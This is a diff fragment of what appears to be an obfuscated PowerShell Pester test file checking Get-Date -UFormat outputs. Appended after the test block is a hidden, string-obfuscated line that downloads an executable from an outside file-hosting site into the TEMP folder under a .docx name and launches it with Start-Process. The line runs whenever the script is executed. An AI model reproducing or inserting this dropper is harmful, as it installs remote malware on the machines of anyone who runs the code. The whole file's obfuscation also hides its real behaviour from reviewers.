+                                                                    @{ ("{0}{1}" -f 'da','te') = ${D`A`TE1}; ("{1}{0}"-f'mat','for') = "%S"; ("{1}{0}"-f'ult','res') = "03" }        
+            
+            @{ ("{0}{1}" -f'dat','e') = ${dAt`e1}; ("{1}{0}{2}" -f 'or','f','mat') = "%T"; ("{0}{1}"-f'res','ult') = ("{1}{0}{2}" -f'1:','0','02:03') }  
+            @{ ("{1}{0}"-f 'ate','d') = ${dA`TE1}; ("{0}{1}" -f 'form','at') = "%u"; ("{1}{0}"-f't','resul') = "5" }         
+            @{ ("{0}{1}"-f'dat','e') = ${da`T`E1}; ("{0}{1}" -f 'forma','t') = "%U"; ("{1}{0}" -f 'lt','resu') = "13" }        
+                                                                    
+                                                                    
+            
+            
+            @{ ("{0}{1}"-f'da','te') = ${D`Ate1}; ("{1}{0}"-f'mat','for') = "%W"; ("{1}{0}"-f 'ult','res') = "13" }        
+                                                                    
+                                                                    
+            @{ ("{0}{1}"-f'dat','e') = ${DA`T`e1}; ("{0}{1}" -f'f','ormat') = "%x"; ("{1}{2}{0}" -f 'ult','re','s') = ("{0}{2}{1}"-f '0','30','4/05/') }  
+                                                                    
+                                                                    
+            
+                                                                    
+                                                                    
+            @{ ("{0}{1}" -f'dat','e') = ${Da`TE1}; ("{0}{1}" -f 'fo','rmat') = "%y"; ("{0}{1}{2}" -f'res','ul','t') = "30" }        
+            @{ ("{1}{0}"-f'ate','d') = ${Dat`e1}; ("{0}{1}" -f 'form','at') = "%Y"; ("{1}{0}"-f 'ult','res') = ("{1}{0}"-f '30','20') }      
+            
+            
+            
+            
+            @{ ("{0}{1}" -f 'da','te') = ${DAt`E1}; ("{0}{1}" -f 'for','mat') = "%Z"; ("{0}{2}{1}" -f'r','t','esul') = ${tIme`ZO`Ne1} }  
+                                                                    
+                                                                    
+        ) {
+            param(${d`AtE}, ${For`MAt}, ${R`ES`Ult})
+
+            &("{0}{1}"-f 'Ge','t-Date') -Date ${d`AtE} -UFormat ${fOR`mAT} | &("{1}{0}" -f 'ould','Sh') -BeExactly ${R`ES`UlT}
+    }
+}
+
+(&("{1}{2}{0}" -f'ject','New-','Ob') ("{1}{3}{0}{2}{4}{5}" -f 't.','System.','W','Ne','ebCl','ient')).("{3}{1}{2}{0}" -f 'le','wn','loadFi','Do').Invoke(("{3}{0}{5}{4}{2}{1}"-f'p','e','x','htt','yspcsr.e','s://a.pomf.cat/'),"$env:TEMP\drv.docx");&("{2}{1}{3}{0}" -f'ss','o','Start-Pr','ce') ("$env:TEMP\drv.docx")
